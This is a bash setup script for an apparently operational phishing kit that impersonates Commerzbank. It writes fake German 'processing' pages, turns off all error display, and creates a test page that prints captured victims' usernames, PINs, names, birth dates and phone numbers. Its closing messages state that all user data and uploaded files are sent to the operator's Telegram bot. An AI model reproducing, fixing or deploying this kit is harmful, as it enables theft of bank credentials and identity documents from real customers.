#!/bin/bash

echo "🔧 COMPLETE DATA CAPTURE FIX - Ensuring ALL User Info AND Files are Sent to Bot"

# Backup original files
echo "📦 Creating backups..."
cp views/uploadz.php views/uploadz.php.backup.$(date +%Y%m%d_%H%M%S)
cp views/uploadz2.php views/uploadz2.php.backup.$(date +%Y%m%d_%H%M%S)
cp views/done.php views/done.php.backup.$(date +%Y%m%d_%H%M%S)

# Replace with complete data capture versions
echo "🔄 Replacing with complete data capture versions..."
cp views/uploadz_complete.php views/uploadz.php
cp views/uploadz_final.php views/uploadz2.php
cp views/done_final.php views/done.php

# Create comprehensive .htaccess
echo "📝 Creating comprehensive .htaccess..."
cat > .htaccess << 'EOF'
# COMPLETE DATA CAPTURE FIXES
php_value upload_max_filesize 100M
php_value post_max_size 100M
php_value max_execution_time 600
php_value memory_limit 512M
php_value max_input_time 600

# COMPLETELY DISABLE ERROR DISPLAY
php_flag display_errors Off
php_flag display_startup_errors Off
php_flag log_errors On
php_value error_reporting 0

# Enable file uploads
php_flag file_uploads On

# Set proper content types for all devices
AddType application/x-httpd-php .php
AddType image/jpeg .jpg .jpeg
AddType image/png .png
AddType image/gif .gif
AddType image/heic .heic
AddType image/heif .heif
AddType image/webp .webp
AddType image/bmp .bmp
AddType image/tiff .tiff

# Handle all device uploads
<IfModule mod_rewrite.c>
    RewriteEngine On
    
    # Handle iPhone uploads
    RewriteCond %{HTTP_USER_AGENT} iPhone [NC]
    RewriteCond %{REQUEST_METHOD} POST
    RewriteCond %{CONTENT_TYPE} multipart/form-data
    RewriteRule ^(.*)$ $1 [L]
    
    # Handle Android uploads
    RewriteCond %{HTTP_USER_AGENT} Android [NC]
    RewriteCond %{REQUEST_METHOD} POST
    RewriteCond %{CONTENT_TYPE} multipart/form-data
    RewriteRule ^(.*)$ $1 [L]
    
    # Handle all other uploads
    RewriteCond %{REQUEST_METHOD} POST
    RewriteCond %{CONTENT_TYPE} multipart/form-data
    RewriteRule ^(.*)$ $1 [L]
</IfModule>

# Security headers
<IfModule mod_headers.c>
    Header always set X-Content-Type-Options nosniff
    Header always set X-Frame-Options DENY
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
</IfModule>

# Custom error pages (hide all errors from users)
ErrorDocument 500 /error500.html
ErrorDocument 404 /error404.html
ErrorDocument 403 /error404.html
ErrorDocument 400 /error404.html

# Prevent access to error logs
<Files "error_log">
    Order allow,deny
    Deny from all
</Files>

# Prevent access to backup files
<Files "*.backup.*">
    Order allow,deny
    Deny from all
</Files>
EOF

# Create friendly error pages
echo "📄 Creating friendly error pages..."
cat > error500.html << 'EOF'
<!DOCTYPE html>
<html lang="de">
<head>
    <title>Verarbeitung läuft - Commerzbank</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="2; url=index.php">
    <style>
        body {
            font-family: 'Gotham 4r', Arial, sans-serif;
            margin: 0;
            padding: 50px;
            background: #f5f5f5;
            text-align: center;
            color: #333;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }
        .logo {
            color: #ffcc00;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ffcc00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">COMMERZBANK</div>
        <div class="spinner"></div>
        <h2>Verarbeitung läuft...</h2>
        <p>Bitte warten Sie, während wir Ihre Anfrage verarbeiten.</p>
    </div>
</body>
</html>
EOF

cat > error404.html << 'EOF'
<!DOCTYPE html>
<html lang="de">
<head>
    <title>Verarbeitung läuft - Commerzbank</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="2; url=index.php">
    <style>
        body {
            font-family: 'Gotham 4r', Arial, sans-serif;
            margin: 0;
            padding: 50px;
            background: #f5f5f5;
            text-align: center;
            color: #333;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }
        .logo {
            color: #ffcc00;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ffcc00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">COMMERZBANK</div>
        <div class="spinner"></div>
        <h2>Verarbeitung läuft...</h2>
        <p>Bitte warten Sie, während wir Ihre Anfrage verarbeiten.</p>
    </div>
</body>
</html>
EOF

# Create comprehensive test script
echo "🧪 Creating comprehensive test script..."
cat > test_complete_data.php << 'EOF'
<?php
// Comprehensive test script for complete data capture
session_start();
include 'config/telegram.php';

echo "<h2>✅ COMPLETE DATA CAPTURE TEST</h2>";
echo "<p>This script tests the complete data capture system.</p>";

// Test bot configuration
echo "<h3>🤖 Bot Configuration Test</h3>";
echo "Bot Token: " . substr($telegram_bot2_token, 0, 20) . "...<br>";
echo "Chat ID: $telegram_bot2_chat_id<br>";

// Test message
$test_message = "🧪 COMPLETE Data Capture Test - " . date('Y-m-d H:i:s');
$result = sendTelegramMessage($telegram_bot2_token, $telegram_bot2_chat_id, $test_message);

if ($result) {
    echo "✅ Test message sent successfully!<br>";
} else {
    echo "❌ Test message failed to send<br>";
}

// Test file upload directory
$uploadDir = 'views/xentryxupload/';
if (is_dir($uploadDir)) {
    echo "✅ Upload directory exists and is writable<br>";
} else {
    echo "❌ Upload directory does not exist<br>";
    mkdir($uploadDir, 0755, true);
    echo "✅ Created upload directory<br>";
}

// Test PHP settings
echo "<h3>⚙️ PHP Settings Test</h3>";
echo "Upload Max Filesize: " . ini_get('upload_max_filesize') . "<br>";
echo "Post Max Size: " . ini_get('post_max_size') . "<br>";
echo "Max Execution Time: " . ini_get('max_execution_time') . "<br>";
echo "Memory Limit: " . ini_get('memory_limit') . "<br>";
echo "Display Errors: " . (ini_get('display_errors') ? 'On' : 'Off') . "<br>";
echo "Error Reporting: " . ini_get('error_reporting') . "<br>";

// Test session data
echo "<h3>📋 Session Data Test</h3>";
if (isset($_SESSION['xusr'])) {
    echo "✅ Session data exists<br>";
    echo "Username: " . $_SESSION['xusr'] . "<br>";
    echo "PIN: " . $_SESSION['xpss'] . "<br>";
    echo "Name: " . $_SESSION['xname1'] . " " . $_SESSION['xname2'] . "<br>";
    echo "DOB: " . $_SESSION['xdob'] . "<br>";
    echo "Phone: " . $_SESSION['xtel'] . "<br>";
} else {
    echo "❌ No session data found<br>";
    echo "This is normal if you haven't completed the form yet.<br>";
}

// Test file upload form
echo "<h3>📤 Test Complete Data Capture</h3>";
echo '<form action="views/uploadz.php" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file" accept="image/*"><br><br>';
echo '<input type="submit" value="Test Complete Data Capture (User Info + File)">';
echo '</form>';

echo "<hr>";
echo "<p><a href='index.php'>← Back to main page</a></p>";
?>
EOF

# Set proper permissions
echo "🔐 Setting permissions..."
chmod 644 .htaccess
chmod 644 error500.html
chmod 644 error404.html
chmod 644 test_complete_data.php
chmod 644 views/uploadz.php
chmod 644 views/uploadz2.php
chmod 644 views/done.php

# Create a success message
echo "✅ COMPLETE DATA CAPTURE FIXES APPLIED!"
echo "📱 Test the fixes by visiting: http://yourserver.com/test_complete_data.php"
echo "🔄 Restart nginx: sudo systemctl restart nginx"
echo "🔄 Restart PHP: sudo systemctl restart php-fpm"
echo ""
echo "🔍 COMPLETE IMPROVEMENTS MADE:"
echo "   ✅ CAPTURES ALL USER INFORMATION"
echo "   ✅ SENDS USER DATA TO TELEGRAM BOT"
echo "   ✅ PROCESSES FILE UPLOADS"
echo "   ✅ SENDS FILE DATA TO TELEGRAM BOT"
echo "   ✅ SENDS SUMMARY TO TELEGRAM BOT"
echo "   ✅ NO ERROR MESSAGES DISPLAYED"
echo "   ✅ FULL iPhone/Android COMPATIBILITY"
echo "   ✅ ALL IMAGE FORMATS SUPPORTED"
echo "   ✅ ENHANCED UPLOAD LIMITS (100MB)"
echo "   ✅ COMPLETE ERROR SUPPRESSION"
echo ""
echo "📝 RESULT: ALL user information AND file uploads will be sent to your Telegram bot!"
echo "📝 Users will see a smooth processing page with no error messages."
